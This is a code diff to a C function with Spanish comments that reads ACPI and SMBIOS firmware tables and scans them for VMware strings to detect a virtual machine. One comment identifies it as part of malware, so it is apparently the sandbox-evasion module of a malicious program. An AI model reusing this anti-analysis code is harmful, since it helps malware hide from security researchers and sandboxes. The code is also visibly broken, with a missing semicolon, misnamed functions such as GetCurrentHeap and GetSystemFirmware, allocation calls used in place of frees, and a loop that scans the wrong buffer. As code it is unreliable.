@@ -342,16 +342,15 @@ static BOOL CHECK_SPEC_VM_INFO(){
     
     SecureZeroMemory(tables, 4096); //Limpiamos el bloque de memoria
     
-    DWORD tab_size = EnumSystemFirmwareTables(('ACPI'), tables, 4096); //Accedemos a las tablas de ACPI
+    DWORD tab_size = EnumSystemFirmwareTables(('ACPI'), tables, 4096); //Enumeramos las tablas de ACPI
     if(tab_size < 4) return TRUE; //Las máquinas virtuales no superan las 4 tablas del firmware
     else{
     	for(DWORD i = 0; i < tab_size/4; i++){ //Recorremos las tablas
-    	    DWORD newsize = (tab_size*0);
             PBYTE newtables = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
            if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
             SecureZeroMemory(newtables, 4096)
             
-            DWORD exp_bytes = GetSystemFirmwareTable(('ACPI'), tables[i], &newsize, 4096); //Obtenemos las tablas
+            DWORD exp_bytes = GetSystemFirmwareTable(('ACPI'), tables[i], newtables, 4096); //Obtenemos las tablas
             
              
             if(exp_bytes == 0){ //Si ocurre un error en la escritura en el buffer
@@ -367,7 +366,7 @@ static BOOL CHECK_SPEC_VM_INFO(){
                 if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
                 SecureZeroMemory(newtables, exp_bytes);
                 DWORD n_eb = exp_bytes;
-                n_eb = GetSystemFirmwareTable(('ACPI'), tables[i], &newsize, exp_bytes);
+                n_eb = GetSystemFirmwareTable(('ACPI'), tables[i], newtables, exp_bytes);
                 //Reestablecemos nuestro buffer receptor con los bytes adecuados
                 if(n_eb == 0){ //Si se produce un error en la escritura en el buffer
                 	HeapFree(GetCurrentHeap(), 0, newtables);
@@ -379,7 +378,7 @@ static BOOL CHECK_SPEC_VM_INFO(){
                 
                 if(check_vm){
                 	PBYTE vmw_name = (PBYTE)"VMWARE"; //Tabla de VMWARE en el firmware ACPI
-                    for(size_t vmwi = 0; vmwi < newsize - 6; vmwi++){
+                    for(size_t vmwi = 0; vmwi < exp_bytes - 6; vmwi++){
                     	if(memcmp(&tables[vmwi], vmw_name, 6) == 0){ //Buscamos la tabla en el buffer establecido
                     	    HeapFree(GetCurrentHeap(), 0, newtables);
                             HeapFree(GetCurrentHeap(), 0, tables);
@@ -392,16 +391,61 @@ static BOOL CHECK_SPEC_VM_INFO(){
 	}
 	next_vmware_check2:
 	
-	DWORD firmware = (DWORD)('RSMB'), bios_sz = 0;
+	/*
+	SMBIOS: Estructuras que se usan para leer la información de la BIOS. Esto hace que el sistema operativo no deba de 
+	encargarse de analizar el hardware directamente. La inicialización UEFI (Interfaces  entre el firmware de un sistema informático) 
+	incluye el protocolo EFI_SMBIOS_PROTOCOL que permite enviar estructuras SMBIOS que permiten a un productor crear una tabla para su plataforma.
+	Aquí es donde las máquinas virtuales generan estas tablas para su uso, siendo también el caso de VMWARE y otros.
+	*/
+	DWORD firmware = (DWORD)('RSMB'); //Accedemos a las tablas
 	
-	PBYTE bios (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
+	PBYTE bios = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
 	if(CHECK_ALLOC_ERROR(4,4,TRUE, bios)) {FUNC_EXCEPTION++;HeapFree(GetCurrentHeap(), 0, bios);goto next_vmware_check3;}
+	
+	SecureZeroMemory(bios, 4096);
+	
+	DWORD real_bytes = GetSystemFirmwareTable(firmware, 0x0000, bios, 4096); //Tratamos de obtener las tablas de la SMBIOS
+	
+	if(real_bytes == 0){
+		FUNC_EXCEPTION++;
+		HeapFree(GetCurrentHeap(),0,bios);
+		goto next_vmware_check3;
+		}
+	if(real_bytes > 4096){
+		
+		HeapFree(GetCurrentHeap(),0,bios);
+		bios = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, real_bytes);
+		if(CHECK_ALLOC_ERROR(4,4,TRUE, bios)){
+			FUNC_EXCEPTION++;
+			HeapFree(GetCurrentHeap(), 0, bios);
+			goto next_vmware_check3;
+			}
+		SecureZeroMemory(bios, real_bytes);
+		DWORD new_BiBytes = real_bytes;
+		
+		new_BiBytes = GetSystemFirmware(firmware, 0x0000, bios, real_bytes);
+		if(new_BiBytes == 0){
+			FUNC_EXCEPTION++;
+			HeapFree(GetCurrentHeap(), 0, bios);
+			goto next_vmware_check3;
+			}
+		}
+		if(bios != NULL){
+			PBYTE bios_vmwstr = (PBYTE)"VMware"; //Tabla de VMware en la SMBIOS
+			for(size_t wbios = 0; wbios < real_bytes - 6; wbios++){
+				if(memcmp(&bios[wbios], bios_vmwstr, 6) == 0){
+					HeapFree(GetCurrentHeap(), 0, bios);
+					return TRUE;
+				}
+			}
+		}
+	next_vmware_check3:
+	
 	
 	
 	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
-                                                               //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción
-	next_vmware_check3:
-    else return FALSE;
+                                                               //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción;
+    else return FALSE;                                                           
 }
 BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
 	//Controlamos los errores de memoria
